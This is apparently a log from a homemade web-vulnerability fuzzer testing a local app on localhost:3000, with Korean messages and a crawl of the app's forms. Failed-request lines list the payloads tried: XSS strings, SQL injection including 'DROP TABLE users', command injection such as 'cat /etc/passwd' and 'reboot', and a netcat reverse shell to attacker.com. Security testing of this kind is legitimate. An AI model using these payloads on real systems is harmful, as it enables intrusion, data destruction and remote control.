2024-10-30 20:32:57,457 - ERROR - robots.txt 접근 실패 - 에러: HTTPConnectionPool(host='www.localhost', port=3000): Max retries exceeded with url: /robots.txt (Caused by NameResolutionError("<urllib3.connection.HTTPConnection object at 0x105393740>: Failed to resolve 'www.localhost' ([Errno 8] nodename nor servname provided, or not known)"))
2024-10-30 20:33:56,694 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/posts/add, 페이로드: '<iframe src='javascript:alert("XSS")'></iframe>', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:56,695 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/posts/add, 페이로드: '&& cat /etc/passwd', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:56,695 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/posts/add, 페이로드: '<svg/onload=alert('XSS')>', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:56,695 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/posts/add, 페이로드: '| whoami', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:56,695 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/posts/add, 페이로드: 'admin' --', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:56,695 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/register, 페이로드: '' OR '1'='1' ({', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:56,695 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/register, 페이로드: '' OR '1'='1' /*', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:56,695 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/register, 페이로드: ''; DROP TABLE users; --', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:56,696 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/register, 페이로드: '' OR '1'='1', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:56,696 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/posts/add, 페이로드: '`reboot`', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:56,696 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/posts/add, 페이로드: '$(reboot)', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:56,696 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/register, 페이로드: '<script>alert('XSS')</script>', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:56,696 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/register, 페이로드: 'admin' --', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:56,696 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/register, 페이로드: '' OR '1'='1' #', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:56,696 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/posts/add, 페이로드: '| nc -e /bin/sh attacker.com 1234', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:56,696 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/register, 페이로드: '&& cat /etc/passwd', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:56,696 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/register, 페이로드: '| whoami', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:56,697 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/register, 페이로드: '; ls', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:56,697 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/register, 페이로드: '<iframe src='javascript:alert("XSS")'></iframe>', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:56,697 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/register, 페이로드: '<svg/onload=alert('XSS')>', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:56,697 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/register, 페이로드: '<img src=x onerror=alert('XSS')>', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:56,697 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/register, 페이로드: '$(reboot)', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:56,697 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/register, 페이로드: '`reboot`', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:56,697 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/register, 페이로드: '| nc -e /bin/sh attacker.com 1234', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:56,697 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/register, 페이로드: ''"><script>alert('XSS')</script>', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:56,717 - INFO - NanumGothic font registered successfully.
2024-10-30 20:33:56,744 - INFO - NanumGothic 폰트 등록 성공
2024-10-30 20:33:56,833 - INFO - [PDFReport] 리포트가 fuzzer_report.pdf에 생성되었습니다.
2024-10-30 20:33:56,834 - INFO - [Main] 웹 퍼징이 완료되었습니다.
2024-10-30 20:35:32,694 - INFO - robots.txt가 존재하지 않습니다. 크롤링 규칙을 제한하지 않습니다.
2024-10-30 20:35:32,695 - INFO - [StaticCrawler] 방문 중: http://localhost:3000/
2024-10-30 20:35:32,701 - INFO - [StaticCrawler] 방문 중: http://localhost:3000
2024-10-30 20:35:32,705 - INFO - [StaticCrawler] 방문 중: http://localhost:3000/products
2024-10-30 20:35:32,709 - INFO - [StaticCrawler] 방문 중: http://localhost:3000/posts
2024-10-30 20:35:32,713 - INFO - [StaticCrawler] 방문 중: http://localhost:3000/login
2024-10-30 20:35:32,716 - INFO - [StaticCrawler] 방문 중: http://localhost:3000/products/add
2024-10-30 20:35:32,719 - INFO - [StaticCrawler] 방문 중: http://localhost:3000/posts/add
2024-10-30 20:35:32,722 - INFO - [StaticCrawler] 방문 중: http://localhost:3000/register
2024-10-30 20:35:32,725 - INFO - [StaticCrawler] 크롤링 완료: 7개의 URL 수집.
2024-10-30 20:35:33,629 - INFO - [DynamicCrawler] 방문 중: http://localhost:3000/, 깊이: 0
2024-10-30 20:35:33,767 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://localhost:3000/
2024-10-30 20:35:33,810 - INFO - [DynamicCrawler] 방문 중: http://localhost:3000/posts, 깊이: 1
2024-10-30 20:35:33,853 - INFO - [DynamicCrawler] 발견된 폼: 1개, 독립 입력 필드: 0개 - URL: http://localhost:3000/posts
2024-10-30 20:35:33,865 - INFO - [DynamicCrawler] 방문 중: http://localhost:3000, 깊이: 1
2024-10-30 20:35:33,888 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://localhost:3000/
2024-10-30 20:35:33,899 - INFO - [DynamicCrawler] 방문 중: http://localhost:3000/login, 깊이: 1
2024-10-30 20:35:33,925 - INFO - [DynamicCrawler] 발견된 폼: 1개, 독립 입력 필드: 0개 - URL: http://localhost:3000/login
2024-10-30 20:35:33,938 - INFO - [DynamicCrawler] 방문 중: http://localhost:3000/products, 깊이: 1
2024-10-30 20:35:33,964 - INFO - [DynamicCrawler] 발견된 폼: 1개, 독립 입력 필드: 0개 - URL: http://localhost:3000/products
2024-10-30 20:35:33,979 - INFO - [DynamicCrawler] 방문 중: http://localhost:3000, 깊이: 2
2024-10-30 20:35:34,001 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://localhost:3000/
2024-10-30 20:35:34,011 - INFO - [DynamicCrawler] 방문 중: http://localhost:3000/posts/add, 깊이: 2
2024-10-30 20:35:34,033 - INFO - [DynamicCrawler] 발견된 폼: 1개, 독립 입력 필드: 0개 - URL: http://localhost:3000/posts/add
2024-10-30 20:35:34,044 - INFO - [DynamicCrawler] 방문 중: http://localhost:3000, 깊이: 2
2024-10-30 20:35:34,065 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://localhost:3000/
2024-10-30 20:35:34,077 - INFO - [DynamicCrawler] 방문 중: http://localhost:3000, 깊이: 2
2024-10-30 20:35:34,096 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://localhost:3000/
2024-10-30 20:35:34,107 - INFO - [DynamicCrawler] 방문 중: http://localhost:3000/register, 깊이: 2
2024-10-30 20:35:34,131 - INFO - [DynamicCrawler] 발견된 폼: 1개, 독립 입력 필드: 0개 - URL: http://localhost:3000/register
2024-10-30 20:35:34,142 - INFO - [DynamicCrawler] 방문 중: http://localhost:3000/products/add, 깊이: 2
2024-10-30 20:35:34,164 - INFO - [DynamicCrawler] 발견된 폼: 1개, 독립 입력 필드: 0개 - URL: http://localhost:3000/products/add
2024-10-30 20:35:34,175 - INFO - [DynamicCrawler] 방문 중: http://localhost:3000, 깊이: 2
2024-10-30 20:35:34,195 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://localhost:3000/
2024-10-30 20:35:34,206 - INFO - [DynamicCrawler] 방문 중: http://localhost:3000, 깊이: 3
2024-10-30 20:35:34,222 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://localhost:3000/
2024-10-30 20:35:34,232 - INFO - [DynamicCrawler] 방문 중: http://localhost:3000, 깊이: 3
2024-10-30 20:35:34,250 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://localhost:3000/
2024-10-30 20:35:34,259 - INFO - [DynamicCrawler] 방문 중: http://localhost:3000, 깊이: 3
2024-10-30 20:35:34,275 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://localhost:3000/
2024-10-30 20:35:34,285 - INFO - [DynamicCrawler] 방문 중: http://localhost:3000, 깊이: 3
2024-10-30 20:35:34,304 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://localhost:3000/
2024-10-30 20:35:34,314 - INFO - [DynamicCrawler] 방문 중: http://localhost:3000, 깊이: 3
2024-10-30 20:35:34,333 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://localhost:3000/
2024-10-30 20:35:34,344 - INFO - [DynamicCrawler] 방문 중: http://localhost:3000, 깊이: 3
2024-10-30 20:35:34,364 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://localhost:3000/
2024-10-30 20:35:34,374 - INFO - [DynamicCrawler] 방문 중: http://localhost:3000, 깊이: 3
2024-10-30 20:35:34,395 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://localhost:3000/
2024-10-30 20:35:34,406 - INFO - [DynamicCrawler] 방문 중: http://localhost:3000, 깊이: 4
2024-10-30 20:35:34,427 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://localhost:3000/
2024-10-30 20:35:34,438 - INFO - [DynamicCrawler] 방문 중: http://localhost:3000, 깊이: 4
2024-10-30 20:35:34,459 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://localhost:3000/
2024-10-30 20:35:34,470 - INFO - [DynamicCrawler] 방문 중: http://localhost:3000, 깊이: 4
2024-10-30 20:35:34,488 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://localhost:3000/
2024-10-30 20:35:34,498 - INFO - [DynamicCrawler] 방문 중: http://localhost:3000, 깊이: 4
2024-10-30 20:35:34,523 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://localhost:3000/
2024-10-30 20:35:34,535 - INFO - [DynamicCrawler] 방문 중: http://localhost:3000, 깊이: 4
2024-10-30 20:35:34,552 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://localhost:3000/
2024-10-30 20:35:34,563 - INFO - [DynamicCrawler] 방문 중: http://localhost:3000, 깊이: 4
2024-10-30 20:35:34,587 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://localhost:3000/
2024-10-30 20:35:34,598 - INFO - [DynamicCrawler] 방문 중: http://localhost:3000, 깊이: 4
2024-10-30 20:35:34,620 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://localhost:3000/
2024-10-30 20:35:34,631 - INFO - [DynamicCrawler] 방문 중: http://localhost:3000, 깊이: 5
2024-10-30 20:35:34,652 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://localhost:3000/
2024-10-30 20:35:34,664 - INFO - [DynamicCrawler] 방문 중: http://localhost:3000, 깊이: 5
2024-10-30 20:35:34,684 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://localhost:3000/
2024-10-30 20:35:34,698 - INFO - [DynamicCrawler] 방문 중: http://localhost:3000, 깊이: 5
2024-10-30 20:35:34,719 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://localhost:3000/
2024-10-30 20:35:34,730 - INFO - [DynamicCrawler] 방문 중: http://localhost:3000, 깊이: 5
2024-10-30 20:35:34,751 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://localhost:3000/
2024-10-30 20:35:34,764 - INFO - [DynamicCrawler] 방문 중: http://localhost:3000, 깊이: 5
2024-10-30 20:35:34,785 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://localhost:3000/
2024-10-30 20:35:34,796 - INFO - [DynamicCrawler] 방문 중: http://localhost:3000, 깊이: 5
2024-10-30 20:35:34,815 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://localhost:3000/
2024-10-30 20:35:34,826 - INFO - [DynamicCrawler] 방문 중: http://localhost:3000, 깊이: 5
2024-10-30 20:35:34,845 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://localhost:3000/
2024-10-30 20:35:34,856 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://localhost:3000, 스킵.
2024-10-30 20:35:34,856 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://localhost:3000, 스킵.
2024-10-30 20:35:34,856 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://localhost:3000, 스킵.
2024-10-30 20:35:34,856 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://localhost:3000, 스킵.
2024-10-30 20:35:34,856 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://localhost:3000, 스킵.
